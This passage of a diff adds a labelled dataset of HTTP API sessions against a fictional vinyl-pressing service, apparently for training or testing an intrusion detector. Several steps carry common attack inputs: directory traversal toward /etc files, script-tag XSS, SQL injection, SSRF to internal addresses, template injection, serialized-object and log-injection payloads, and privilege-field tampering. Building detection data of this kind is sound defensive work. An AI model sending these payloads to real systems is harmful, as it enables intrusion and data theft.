+          "Authorization": "Bearer token_67"
+        },
+        "body": null,
+        "note": "Data error: relabeled from malicious. The path is a declared track list. The extra query names are not parameters of this operation."
+      },
+      {
+        "id": "sess167-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/projects/proj_67",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_67"
+        },
+        "body": null,
+        "note": "The client views project details."
+      }
+    ]
+  },
+  {
+    "session_id": "sess168",
+    "client_ip": "192.168.140.15",
+    "steps": [
+      {
+        "id": "sess168-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "designer68@chromapress.test",
+          "password": "Password68!"
+        },
+        "note": "The user logs in."
+      },
+      {
+        "id": "sess168-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/projects",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_68"
+        },
+        "body": null,
+        "note": "The client lists projects."
+      },
+      {
+        "id": "sess168-s03",
+        "label": "malicious",
+        "method": "PUT",
+        "path": "/projects/proj_68",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_68"
+        },
+        "body": {
+          "title": "Role Update",
+          "privilege_level": "root"
+        },
+        "note": "The client submits an unallowed privilege_level field."
+      },
+      {
+        "id": "sess168-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/projects/proj_68",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_68"
+        },
+        "body": null,
+        "note": "The client views project details."
+      },
+      {
+        "id": "sess168-s05",
+        "label": "benign",
+        "method": "GET",
+        "path": "/projects/proj_69",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_68"
+        },
+        "body": null,
+        "note": "The client checks a second owned project."
+      }
+    ]
+  },
+  {
+    "session_id": "sess169",
+    "client_ip": "10.0.255.4",
+    "steps": [
+      {
+        "id": "sess169-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "designer69@chromapress.test",
+          "password": "Password69!"
+        },
+        "note": "The user logs in."
+      },
+      {
+        "id": "sess169-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/projects",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_69"
+        },
+        "body": null,
+        "note": "The client lists projects."
+      },
+      {
+        "id": "sess169-s03",
+        "label": "malicious",
+        "method": "GET",
+        "path": "/projects/../../etc/group/tracks",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_69"
+        },
+        "body": null,
+        "note": "The client attempts directory traversal in the path."
+      },
+      {
+        "id": "sess169-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/projects/proj_69",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_69"
+        },
+        "body": null,
+        "note": "The client views project details."
+      }
+    ]
+  },
+  {
+    "session_id": "sess170",
+    "client_ip": "192.168.150.8",
+    "steps": [
+      {
+        "id": "sess170-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "designer70@chromapress.test",
+          "password": "Password70!"
+        },
+        "note": "The user logs in."
+      },
+      {
+        "id": "sess170-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/projects",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_70"
+        },
+        "body": null,
+        "note": "The client lists projects."
+      },
+      {
+        "id": "sess170-s03",
+        "label": "malicious",
+        "method": "POST",
+        "path": "/tracks/track_70/notes",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_70"
+        },
+        "body": {
+          "content": "<script>alert(document.domain)</script>"
+        },
+        "note": "The client submits browser-executed code in a note."
+      },
+      {
+        "id": "sess170-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/tracks/track_70/notes",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_70"
+        },
+        "body": null,
+        "note": "The client retrieves notes."
+      },
+      {
+        "id": "sess170-s05",
+        "label": "benign",
+        "method": "GET",
+        "path": "/projects/proj_70",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_70"
+        },
+        "body": null,
+        "note": "The client views project details."
+      }
+    ]
+  },
+  {
+    "session_id": "sess171",
+    "client_ip": "10.1.1.15",
+    "steps": [
+      {
+        "id": "sess171-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "designer71@chromapress.test",
+          "password": "Password71!"
+        },
+        "note": "The user logs in."
+      },
+      {
+        "id": "sess171-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/projects",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_71"
+        },
+        "body": null,
+        "note": "The client lists projects."
+      },
+      {
+        "id": "sess171-s03",
+        "label": "malicious",
+        "method": "POST",
+        "path": "/projects",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_71"
+        },
+        "body": {
+          "title": "SSRF Test",
+          "description": "Ping http://127.0.0.1:3306/"
+        },
+        "note": "The client includes an internal IP address in the description."
+      },
+      {
+        "id": "sess171-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/projects/proj_71",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_71"
+        },
+        "body": null,
+        "note": "The client views project details."
+      }
+    ]
+  },
+  {
+    "session_id": "sess172",
+    "client_ip": "192.168.160.22",
+    "steps": [
+      {
+        "id": "sess172-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "designer72@chromapress.test",
+          "password": "Password72!"
+        },
+        "note": "The user logs in."
+      },
+      {
+        "id": "sess172-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/projects",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_72"
+        },
+        "body": null,
+        "note": "The client lists projects."
+      },
+      {
+        "id": "sess172-s03",
+        "label": "malicious",
+        "method": "POST",
+        "path": "/projects",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_72"
+        },
+        "body": {
+          "title": "Template Injection",
+          "description": "${3*3}"
+        },
+        "note": "The client submits a template expression payload."
+      },
+      {
+        "id": "sess172-s04",
+        "label": "suspicious_benign",
+        "method": "GET",
+        "path": "/projects/proj_72",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_72",
+          "X-Test-Header": "eval'check"
+        },
+        "body": null,
+        "note": "The client checks project details with an apostrophe in a header."
+      },
+      {
+        "id": "sess172-s05",
+        "label": "benign",
+        "method": "GET",
+        "path": "/projects/proj_73",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_73"
+        },
+        "body": null,
+        "note": "The client checks a second owned project."
+      }
+    ]
+  },
+  {
+    "session_id": "sess173",
+    "client_ip": "10.1.2.20",
+    "steps": [
+      {
+        "id": "sess173-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "designer73@chromapress.test",
+          "password": "Password73!"
+        },
+        "note": "The user logs in."
+      },
+      {
+        "id": "sess173-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/projects",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_73"
+        },
+        "body": null,
+        "note": "The client lists projects."
+      },
+      {
+        "id": "sess173-s03",
+        "label": "malicious",
+        "method": "POST",
+        "path": "/projects",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_73"
+        },
+        "body": {
+          "title": "Java Serialize",
+          "description": "aced0005737200146a6176..."
+        },
+        "note": "The client submits a serialized object payload."
+      },
+      {
+        "id": "sess173-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/projects/proj_73",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_73"
+        },
+        "body": null,
+        "note": "The client views project details."
+      }
+    ]
+  },
+  {
+    "session_id": "sess174",
+    "client_ip": "192.168.170.5",
+    "steps": [
+      {
+        "id": "sess174-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "designer74@chromapress.test",
+          "password": "Password74!"
+        },
+        "note": "The user logs in."
+      },
+      {
+        "id": "sess174-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/projects",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_74"
+        },
+        "body": null,
+        "note": "The client lists projects."
+      },
+      {
+        "id": "sess174-s03",
+        "label": "malicious",
+        "method": "POST",
+        "path": "/projects",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_74"
+        },
+        "body": {
+          "title": "Log Injection",
+          "description": "Record note\n2026-03-10 21:15:00 [WARN] Disk space low"
+        },
+        "note": "The client includes a newline plus a log stamp."
+      },
+      {
+        "id": "sess174-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/projects/proj_74",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_74"
+        },
+        "body": null,
+        "note": "The client views project details."
+      },
+      {
+        "id": "sess174-s05",
+        "label": "benign",
+        "method": "GET",
+        "path": "/projects/proj_75",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_74"
+        },
+        "body": null,
+        "note": "The client checks a second owned project."
+      }
+    ]
+  },
+  {
+    "session_id": "sess175",
+    "client_ip": "10.1.3.11",
+    "steps": [
+      {
+        "id": "sess175-s01",
+        "label": "malicious",
+        "method": "GET",
+        "path": "/admin/logs",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_user"
+        },
+        "body": null,
+        "note": "The client accesses an admin path not in the contract."
+      },
+      {
+        "id": "sess175-s02",
+        "label": "benign",
+        "method": "POST",
+        "path": "/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "designer75@chromapress.test",
+          "password": "Password75!"
+        },
+        "note": "The user logs in."
+      },
+      {
+        "id": "sess175-s03",
+        "label": "benign",
+        "method": "GET",
+        "path": "/projects",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_75"
+        },
+        "body": null,
+        "note": "The client lists projects."
+      },
+      {
+        "id": "sess175-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/projects/proj_75",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_75"
+        },
+        "body": null,
+        "note": "The client views project details."
+      }
+    ]
+  },
+  {
+    "session_id": "sess176",
+    "client_ip": "192.168.180.12",
+    "steps": [
+      {
+        "id": "sess176-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "designer76@chromapress.test",
+          "password": "Password76!"
+        },
+        "note": "The user logs in."
+      },
+      {
+        "id": "sess176-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/projects",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_76"
+        },
+        "body": null,
+        "note": "The client lists projects."
+      },
+      {
+        "id": "sess176-s03",
+        "label": "benign",
+        "method": "GET",
+        "path": "/projects/proj_76a",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_76"
+        },
+        "body": null,
+        "note": "The client views the first owned project."
+      },
+      {
+        "id": "sess176-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/projects/proj_76b",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_76"
+        },
+        "body": null,
+        "note": "The client views a second owned project."
+      },
+      {
+        "id": "sess176-s05",
+        "label": "suspicious_benign",
+        "method": "POST",
+        "path": "/projects/proj_76a/tracks",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_76"
+        },
+        "body": {
+          "trackName": "Track D",
+          "durationSeconds": 175,
+          "pressing_plant": "Plant West"
+        },
+        "note": "The track creation includes a harmless pressing plant field."
+      }
+    ]
+  },
+  {
+    "session_id": "sess177",
+    "client_ip": "10.1.4.8",
+    "steps": [
+      {
+        "id": "sess177-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "designer77@chromapress.test",
+          "password": "Password77!"
+        },
+        "note": "The user logs in."
+      },
+      {
+        "id": "sess177-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/projects",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_77"
+        },
+        "body": null,
+        "note": "The client lists projects."
+      },
+      {
+        "id": "sess177-s03",
+        "label": "suspicious_benign",
+        "method": "POST",
+        "path": "/projects",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_77"
+        },
+        "body": {
+          "title": "Vinyl Master Record\nwith detailed mastering notes",
+          "description": "Standard batch"
+        },
+        "note": "The title contains a newline continuing a sentence."
+      },
+      {
+        "id": "sess177-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/projects/proj_77",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_77"
+        },
+        "body": null,
+        "note": "The client views project details."
+      }
+    ]
+  },
+  {
+    "session_id": "sess178",
+    "client_ip": "192.168.190.15",
+    "steps": [
+      {
+        "id": "sess178-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "designer78@chromapress.test",
+          "password": "Password78!"
+        },
+        "note": "The user logs in."
+      },
+      {
+        "id": "sess178-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/projects",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_78"
+        },
+        "body": null,
+        "note": "The client lists projects."
+      },
+      {
+        "id": "sess178-s03",
+        "label": "malicious",
+        "method": "POST",
+        "path": "/projects",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_78"
+        },
+        "body": {
+          "title": "SQL Injection",
+          "description": "test' OR '1'='1"
+        },
+        "note": "The client submits SQL injection in the description."
+      },
+      {
+        "id": "sess178-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/projects/proj_78",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_78"
+        },
+        "body": null,
+        "note": "The client views project details."
+      },
+      {
+        "id": "sess178-s05",
+        "label": "benign",
+        "method": "GET",
+        "path": "/projects/proj_79",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_78"
+        },
+        "body": null,
+        "note": "The client checks a second owned project."
+      }
+    ]
+  },
+  {
+    "session_id": "sess179",
+    "client_ip": "10.1.5.30",
+    "steps": [
+      {
+        "id": "sess179-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "designer79@chromapress.test",
+          "password": "Password79!"
+        },
+        "note": "The user logs in."
+      },
+      {
+        "id": "sess179-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/projects",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_79"
+        },
+        "body": null,
+        "note": "The client lists projects."
+      },
+      {
+        "id": "sess179-s03",
+        "label": "suspicious_benign",
+        "method": "GET",
+        "path": "/projects/proj_79/tracks",
+        "query": {
+          "ref_x": "proj_secure_9",
+          "ref_y": "proj_secure_8",
+          "ref_z": "proj_secure_7"
+        },
+        "headers": {
+          "Authorization": "Bearer token_79"
+        },
+        "body": null,
+        "note": "Data error: relabeled from malicious. The path is a declared track list. The extra query names are not parameters of this operation."
+      },
+      {
+        "id": "sess179-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/projects/proj_79",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_79"
+        },
+        "body": null,
+        "note": "The client views project details."
+      }
+    ]
+  },
+  {
+    "session_id": "sess180",
+    "client_ip": "192.168.200.4",
+    "steps": [
+      {
+        "id": "sess180-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "designer80@chromapress.test",
+          "password": "Password80!"
+        },
+        "note": "The user logs in."
+      },
+      {
+        "id": "sess180-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/projects",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_80"
+        },
+        "body": null,
+        "note": "The client lists projects."
+      },
+      {
+        "id": "sess180-s03",
+        "label": "malicious",
+        "method": "PUT",
+        "path": "/projects/proj_80",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_80"
+        },
+        "body": {
+          "title": "Privilege Update",
+          "account_type": "administrator"
+        },
+        "note": "The client submits an unallowed account_type field."
+      },
+      {
+        "id": "sess180-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/projects/proj_80",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_80"
+        },
+        "body": null,
+        "note": "The client views project details."
+      },
+      {
+        "id": "sess180-s05",
+        "label": "benign",
+        "method": "GET",
+        "path": "/projects/proj_81",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_80"
+        },
+        "body": null,
+        "note": "The client checks a second owned project."
+      }
+    ]
+  },
+  {
+    "session_id": "sess181",
+    "client_ip": "10.1.6.12",
+    "steps": [
+      {
+        "id": "sess181-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "designer81@chromapress.test",
+          "password": "Password81!"
+        },
+        "note": "The user logs in."
+      },
+      {
+        "id": "sess181-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/projects",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_81"
+        },
+        "body": null,
+        "note": "The client lists projects."
+      },
+      {
+        "id": "sess181-s03",
+        "label": "malicious",
+        "method": "GET",
+        "path": "/projects/../../etc/resolv.conf/tracks",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_81"
+        },
+        "body": null,
+        "note": "The client attempts directory traversal in the path."
+      },
+      {
+        "id": "sess181-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/projects/proj_81",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_81"
+        },
+        "body": null,
+        "note": "The client views project details."
+      }
+    ]
+  },
+  {
+    "session_id": "sess182",
+    "client_ip": "192.168.210.18",
+    "steps": [
+      {
+        "id": "sess182-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "designer82@chromapress.test",
+          "password": "Password82!"
+        },
+        "note": "The user logs in."
+      },
+      {
+        "id": "sess182-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/projects",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_82"
+        },
+        "body": null,
+        "note": "The client lists projects."
+      },
+      {
+        "id": "sess182-s03",
+        "label": "malicious",
+        "method": "POST",
+        "path": "/tracks/track_82/notes",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_82"
+        },
+        "body": {
+          "content": "<script>alert('XSS Payload')</script>"
+        },
+        "note": "The client submits browser-executed code in a note."
+      },
+      {
+        "id": "sess182-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/tracks/track_82/notes",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_82"
+        },
+        "body": null,
+        "note": "The client retrieves notes."
+      },
+      {
+        "id": "sess182-s05",
+        "label": "benign",
+        "method": "GET",
+        "path": "/projects/proj_82",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_82"
+        },
+        "body": null,
+        "note": "The client views project details."
+      }
+    ]
+  },
+  {
+    "session_id": "sess183",
+    "client_ip": "10.1.7.25",
+    "steps": [
+      {
+        "id": "sess183-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "designer83@chromapress.test",
+          "password": "Password83!"
+        },
+        "note": "The user logs in."
+      },
+      {
+        "id": "sess183-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/projects",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_83"
+        },
+        "body": null,
+        "note": "The client lists projects."
+      },
+      {
+        "id": "sess183-s03",
+        "label": "malicious",
+        "method": "POST",
+        "path": "/projects",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_83"
+        },
+        "body": {
+          "title": "SSRF Injection",
+          "description": "Fetch http://192.168.1.1/admin"
+        },
+        "note": "The client includes an internal IP address in the description."
+      },
+      {
+        "id": "sess183-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/projects/proj_83",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_83"
+        },
+        "body": null,
+        "note": "The client views project details."
+      }
+    ]
+  },
+  {
+    "session_id": "sess184",
+    "client_ip": "192.168.220.9",
+    "steps": [
+      {
+        "id": "sess184-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "designer84@chromapress.test",
+          "password": "Password84!"
+        },
+        "note": "The user logs in."
+      },
+      {
+        "id": "sess184-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/projects",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_84"
+        },
+        "body": null,
+        "note": "The client lists projects."
+      },
+      {
+        "id": "sess184-s03",
+        "label": "malicious",
+        "method": "POST",
+        "path": "/projects",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_84"
+        },
+        "body": {
+          "title": "Template Payload",
+          "description": "${5*5}"
+        },
+        "note": "The client submits a template expression payload."
+      },
+      {
+        "id": "sess184-s04",
+        "label": "suspicious_benign",
+        "method": "GET",
+        "path": "/projects/proj_84",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_84",
+          "X-Eval-Info": "parsing'test"
+        },
+        "body": null,
+        "note": "The client checks project details with an apostrophe in a header."
+      },
+      {
+        "id": "sess184-s05",
+        "label": "benign",
+        "method": "GET",
+        "path": "/projects/proj_85",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_84"
+        },
+        "body": null,
+        "note": "The client checks a second owned project."
+      }
+    ]
+  },
+  {
+    "session_id": "sess185",
+    "client_ip": "10.1.8.40",
+    "steps": [
+      {
+        "id": "sess185-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "designer85@chromapress.test",
+          "password": "Password85!"
+        },
+        "note": "The user logs in."
+      },
+      {
+        "id": "sess185-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/projects",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_85"
+        },
+        "body": null,
+        "note": "The client lists projects."
+      },
+      {
+        "id": "sess185-s03",
+        "label": "malicious",
+        "method": "POST",
+        "path": "/projects",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_85"
+        },
+        "body": {
+          "title": "Serialized Data",
+          "description": "aced0005737200166a6176612..."
+        },
+        "note": "The client submits a serialized object payload."
+      },
+      {
+        "id": "sess185-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/projects/proj_85",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_85"
+        },
+        "body": null,
+        "note": "The client views project details."
+      }
+    ]
+  },
+  {
+    "session_id": "sess186",
+    "client_ip": "192.168.230.14",
+    "steps": [
+      {
+        "id": "sess186-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "designer86@chromapress.test",
+          "password": "Password86!"
+        },
+        "note": "The user logs in."
+      },
+      {
+        "id": "sess186-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/projects",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_86"
+        },
+        "body": null,
+        "note": "The client lists projects."
+      },
+      {
+        "id": "sess186-s03",
+        "label": "malicious",
+        "method": "POST",
+        "path": "/projects",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_86"
+        },
+        "body": {
+          "title": "Log Inject",
+          "description": "Review summary\n2026-03-10 23:00:00 [FATAL] Kernel panic"
+        },
+        "note": "The client includes a newline plus a log stamp."
+      },
+      {
+        "id": "sess186-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/projects/proj_86",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_86"
+        },
+        "body": null,
+        "note": "The client views project details."
+      },
+      {
+        "id": "sess186-s05",
+        "label": "benign",
+        "method": "GET",
+        "path": "/projects/proj_87",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_86"
+        },
+        "body": null,
+        "note": "The client checks a second owned project."
+      }
+    ]
+  },
+  {
+    "session_id": "sess187",
+    "client_ip": "10.1.9.50",
+    "steps": [
+      {
+        "id": "sess187-s01",
+        "label": "malicious",
+        "method": "GET",
+        "path": "/admin/export",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_user"
+        },
+        "body": null,
+        "note": "The client accesses an admin path not in the contract."
+      },
+      {
+        "id": "sess187-s02",
+        "label": "benign",
+        "method": "POST",
+        "path": "/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "designer87@chromapress.test",
+          "password": "Password87!"
+        },
+        "note": "The user logs in."
+      },
+      {
+        "id": "sess187-s03",
+        "label": "benign",
+        "method": "GET",
+        "path": "/projects",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_87"
+        },
+        "body": null,
+        "note": "The client lists projects."
+      },
+      {
+        "id": "sess187-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/projects/proj_87",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_87"
+        },
+        "body": null,
+        "note": "The client views project details."
+      }
+    ]
+  },
+  {
+    "session_id": "sess188",
+    "client_ip": "192.168.240.2",
+    "steps": [
+      {
+        "id": "sess188-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "designer88@chromapress.test",
+          "password": "Password88!"
+        },
+        "note": "The user logs in."
+      },
+      {
+        "id": "sess188-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/projects",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_88"
+        },
+        "body": null,
+        "note": "The client lists projects."
+      },
+      {
+        "id": "sess188-s03",
+        "label": "benign",
+        "method": "GET",
+        "path": "/projects/proj_88a",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_88"
+        },
+        "body": null,
+        "note": "The client views the first owned project."
+      },
+      {
+        "id": "sess188-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/projects/proj_88b",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_88"
+        },
+        "body": null,
+        "note": "The client views a second owned project."
+      },
+      {
+        "id": "sess188-s05",
+        "label": "suspicious_benign",
+        "method": "POST",
+        "path": "/projects/proj_88a/tracks",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_88"
+        },
+        "body": {
+          "trackName": "Track E",
+          "durationSeconds": 195,
+          "vinyl_weight": "180g"
+        },
+        "note": "The track creation includes a harmless vinyl weight field."
+      }
+    ]
+  },
+  {
+    "session_id": "sess189",
+    "client_ip": "10.1.10.15",
+    "steps": [
+      {
+        "id": "sess189-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "designer89@chromapress.test",
+          "password": "Password89!"
+        },
+        "note": "The user logs in."
+      },
+      {
+        "id": "sess189-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/projects",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_89"
+        },
+        "body": null,
+        "note": "The client lists projects."
+      },
+      {
+        "id": "sess189-s03",
+        "label": "suspicious_benign",
+        "method": "POST",
+        "path": "/projects",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_89"
+        },
+        "body": {
+          "title": "Master Vinyl Run\nwith complete song listing",
+          "description": "Standard edition"
+        },
+        "note": "The title contains a newline continuing a sentence."
+      },
+      {
+        "id": "sess189-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/projects/proj_89",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_89"
+        },
+        "body": null,
+        "note": "The client views project details."
+      }
+    ]
+  },
+  {
+    "session_id": "sess190",
+    "client_ip": "192.168.250.30",
+    "steps": [
+      {
+        "id": "sess190-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "designer90@chromapress.test",
+          "password": "Password90!"
+        },
+        "note": "The user logs in."
+      },
+      {
+        "id": "sess190-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/projects",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_90"
+        },
+        "body": null,
+        "note": "The client lists projects."
+      },
+      {
+        "id": "sess190-s03",
+        "label": "malicious",
+        "method": "POST",
+        "path": "/projects",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_90"
+        },
+        "body": {
+          "title": "SQL Injection",
+          "description": "test' OR '1'='1"
+        },
+        "note": "The client submits SQL injection in the description."
+      },
+      {
+        "id": "sess190-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/projects/proj_90",
